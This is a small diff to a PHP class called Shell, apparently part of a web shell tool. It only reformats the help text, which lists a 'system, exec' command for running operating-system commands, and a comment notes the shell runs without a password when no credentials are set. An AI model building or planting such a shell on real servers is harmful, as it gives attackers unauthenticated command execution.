@@ -31,11 +31,11 @@ class Shell
 	/**
 	 * Help, natywne polecenia
 	 */
-	const HELP = <<<'DATA'
+	const HELP = '
 help - Wyświetlanie pomocy
 modules - Informacje o modułach
 system, exec - Uruchomienie polecenia systemowego
-DATA;
+';
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
